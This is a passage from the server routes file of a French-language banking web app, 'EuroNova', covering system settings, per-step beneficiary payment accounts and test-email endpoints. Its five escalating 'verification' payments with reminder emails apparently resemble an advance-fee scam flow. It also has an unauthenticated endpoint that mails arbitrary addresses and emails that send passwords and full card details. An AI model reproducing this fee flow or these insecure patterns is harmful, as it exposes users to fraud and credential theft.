        ...req.body,
        stepNumber
      });
      
      const paymentAccount = await storage.updatePaymentAccountForStep(stepNumber, validatedData);
      
      res.status(200).json(paymentAccount);
    } catch (error) {
      console.error("Error updating payment account:", error);
      if (error instanceof z.ZodError) {
        return res.status(400).json({ message: "Invalid payment account data", errors: error.errors });
      }
      res.status(500).json({ message: "Failed to update payment account" });
    }
  });

  // System Settings routes
  app.get('/api/system-settings', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const settings = await storage.getAllSystemSettings();
      res.status(200).json(settings);
    } catch (error) {
      console.error("Error fetching system settings:", error);
      res.status(500).json({ message: "Error fetching system settings" });
    }
  });

  app.get('/api/system-settings/:key', isAuthenticated, async (req, res) => {
    try {
      const key = req.params.key;
      const setting = await storage.getSystemSetting(key);
      
      if (!setting) {
        return res.status(404).json({ message: "Setting not found" });
      }
      
      res.status(200).json(setting);
    } catch (error) {
      console.error("Error fetching system setting:", error);
      res.status(500).json({ message: "Error fetching system setting" });
    }
  });

  app.post('/api/system-settings', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const settingData = req.body;
      
      // Validate the data
      const validatedData = insertSystemSettingSchema.parse(settingData);
      
      // Check if setting already exists
      const existingSetting = await storage.getSystemSetting(validatedData.settingKey);
      if (existingSetting) {
        return res.status(400).json({ message: "Setting already exists" });
      }
      
      // Set the updatedBy field if not provided
      if (!validatedData.updatedBy && req.user) {
        validatedData.updatedBy = req.user.id;
      }
      
      const setting = await storage.createSystemSetting(validatedData);
      res.status(201).json(setting);
    } catch (error) {
      console.error("Error creating system setting:", error);
      res.status(500).json({ message: "Error creating system setting" });
    }
  });

  app.put('/api/system-settings/:key', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      const key = req.params.key;
      const { settingValue } = req.body;
      
      if (!settingValue) {
        return res.status(400).json({ message: "Setting value is required" });
      }
      
      // Update the setting
      const setting = await storage.updateSystemSetting(key, settingValue, req.user ? req.user.id : undefined);
      
      if (!setting) {
        return res.status(404).json({ message: "Setting not found" });
      }
      
      res.status(200).json(setting);
    } catch (error) {
      console.error("Error updating system setting:", error);
      res.status(500).json({ message: "Error updating system setting" });
    }
  });

  // Endpoint for client to get beneficiary account for payments
  app.get('/api/get-payment-account/:step', isAuthenticated, async (req, res) => {
    try {
      const step = req.params.step;
      if (!/^step[1-5]$/.test(step)) {
        return res.status(400).json({ message: "Invalid step parameter" });
      }
      
      // Get the payment account from system settings
      const paymentAccountSetting = await storage.getSystemSetting(`payment_account_${step}`);
      
      if (!paymentAccountSetting) {
        return res.status(404).json({ 
          message: "Payment account not configured", 
          accountNumber: null 
        });
      }
      
      // Get account details
      const account = await storage.getAccountByNumber(paymentAccountSetting.settingValue);
      
      if (!account) {
        return res.status(404).json({ 
          message: "Payment account not found", 
          accountNumber: paymentAccountSetting.settingValue 
        });
      }
      
      // Get account owner details
      const owner = await storage.getUser(account.userId);
      
      if (!owner) {
        return res.status(404).json({ 
          message: "Account owner not found", 
          accountNumber: account.accountNumber 
        });
      }
      
      // Return account information
      res.status(200).json({
        accountNumber: account.accountNumber,
        accountOwner: `${owner.firstName} ${owner.lastName}`,
        description: paymentAccountSetting.description || null
      });
    } catch (error) {
      console.error("Error fetching payment account:", error);
      res.status(500).json({ message: "Error fetching payment account" });
    }
  });
  
  // Create HTTP server
  // Route de test pour l'envoi d'email
  app.get('/api/test-email', async (req, res) => {
    try {
      // Utiliser l'email fourni ou une adresse par défaut
      const email = (req.query.email as string) || 'dorellso930@gmail.com';
      
      console.log(`🧪 Test d'envoi d'email à ${email} avec l'adresse d'expéditeur: ecreditgroupe@gmail.com`);
      
      const result = await sendEmail(
        email, 
        "EuroNova - Test d'envoi d'email", 
        `
        <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e6e6e6; border-radius: 8px;">
          <div style="text-align: center; margin-bottom: 20px;">
            <h1 style="color: #0c326f; margin: 0;"><span style="color: #0c326f;">Euro</span>Nova</h1>
            <p style="color: #818181; margin-top: 5px;">Votre partenaire bancaire</p>
          </div>
          
          <div style="background-color: #f9f9f9; padding: 15px; border-radius: 8px; margin-bottom: 20px;">
            <h2 style="color: #0c326f; margin-top: 0;">Test d'envoi d'email</h2>
            <p>Ceci est un test d'envoi d'email via l'API Brevo.</p>
            <p>Si vous recevez cet email, cela signifie que la configuration de l'API d'envoi d'emails fonctionne correctement !</p>
          </div>
          
          <div style="margin-top: 30px; padding-top: 20px; border-top: 1px solid #e6e6e6; font-size: 12px; color: #818181; text-align: center;">
            <p>Ce message est un test, merci de ne pas y répondre.</p>
            <p>© ${new Date().getFullYear()} EuroNova. Tous droits réservés.</p>
          </div>
        </div>
        `
      );
      
      if (result) {
        res.json({ success: true, message: "Email envoyé avec succès." });
      } else {
        res.status(500).json({ success: false, message: "Échec de l'envoi de l'email." });
      }
    } catch (error: any) {
      console.error("Erreur lors du test d'envoi d'email:", error);
      res.status(500).json({ success: false, message: error.message });
    }
  });
  
  // Test de tous les types d'emails (protégé, admin uniquement)
  app.get('/api/test-all-emails', isAuthenticated, requireRole('admin'), async (req, res) => {
    try {
      // Utiliser l'email fourni ou une adresse par défaut
      const email = (req.query.email as string) || 'dorellso930@gmail.com';
      const results = [];
      
      // Créer des données de test
      const testUser = {
        id: 999,
        username: "client_test",
        email: email,
        firstName: "Jean",
        lastName: "Dupont",
        role: "client",
        status: "active",
        phone: "+33612345678",
        address: "123 Rue de Paris, 75001 Paris",
        dateOfBirth: "1980-01-01",
        nationality: "Française",
        occupation: "Ingénieur",
        createdAt: new Date(),
        updatedAt: new Date(),
        lastLogin: new Date(),
        profileImage: null
      };
      
      const testAccount = {
        id: 999,
        userId: 999,
        accountNumber: "FR7612345678901234567890123",
        accountType: "current",
        balance: 5000,
        currency: "EUR",
        isActive: true,
        createdAt: new Date()
      };
      
      const testTransaction = {
        id: 999,
        amount: 250,
        type: "transfer",
        fromAccountId: null,
        toAccountId: 999,
        currency: "EUR",
        status: "completed",
        description: "Virement SEPA reçu",
        reference: "VIR123456",
        category: "salary",
        createdAt: new Date()
      };
      
      const testVerificationStep = {
        id: 999,
        userId: 999,
        transactionId: 999,
        step1Amount: 100,
        step2Amount: 150,
        step3Amount: 200,
        step4Amount: 250,
        step5Amount: 300,
        step1Completed: true,
        step2Completed: false,
        step3Completed: false,
        step4Completed: false,
        step5Completed: false,
        step1Date: new Date(),
        step2Date: null,
        step3Date: null,
        step4Date: null,
        step5Date: null,
        notes: "Processus de vérification en cours",
        createdAt: new Date()
      };
      
      console.log(`🧪 Test de tous les emails à ${email}`);
      
      // 1. Email de bienvenue
      console.log("1. Envoi d'un email de bienvenue...");
      const welcomeResult = await sendWelcomeEmail(
        testUser as any,
        testAccount.accountNumber,
        "CL-123456",
        "Mot2Passe!Securise",
        "4111 1111 1111 1111",
        "12/25",
        "123"
      );
      results.push({ type: "welcome", success: welcomeResult });
      
      // 2. Email de notification de transaction
      console.log("2. Envoi d'un email de notification de transaction...");
      const transactionResult = await sendTransactionEmail(
        testUser as any,
        testTransaction as any,
        testAccount as any
      );
      results.push({ type: "transaction", success: transactionResult });
      
      // 3. Email de rappel de paiement (étape 2)
      console.log("3. Envoi d'un email de rappel de paiement...");
      const reminderResult = await sendPaymentReminderEmail(
        testUser as any,
        testVerificationStep as any,
        2
      );
      results.push({ type: "reminder", success: reminderResult });
      
      // 4. Email de statut du compte (activation)
      console.log("4. Envoi d'un email de statut de compte (activation)...");
      const activationResult = await sendAccountStatusEmail(
        testUser as any,
        true
      );
      results.push({ type: "status_active", success: activationResult });
      
      // 5. Email de statut du compte (désactivation)
      console.log("5. Envoi d'un email de statut de compte (désactivation)...");
      const deactivationResult = await sendAccountStatusEmail(
        testUser as any,
        false
      );
      results.push({ type: "status_inactive", success: deactivationResult });
      
      // Envoyer le résumé des résultats
      const allSuccess = results.every(r => r.success);
      if (allSuccess) {
        res.json({ 
          success: true, 
          message: "Tous les emails ont été envoyés avec succès.", 
          results 
        });
      } else {
        const failedEmails = results.filter(r => !r.success).map(r => r.type);
        res.status(500).json({ 
          success: false, 
          message: `Échec de l'envoi de certains emails: ${failedEmails.join(", ")}`, 
          results 
        });
      }
    } catch (error: any) {
      console.error("Erreur lors du test d'envoi des emails:", error);
      res.status(500).json({ success: false, message: error.message });
    }
  });

  const httpServer = createServer(app);

  return httpServer;
}
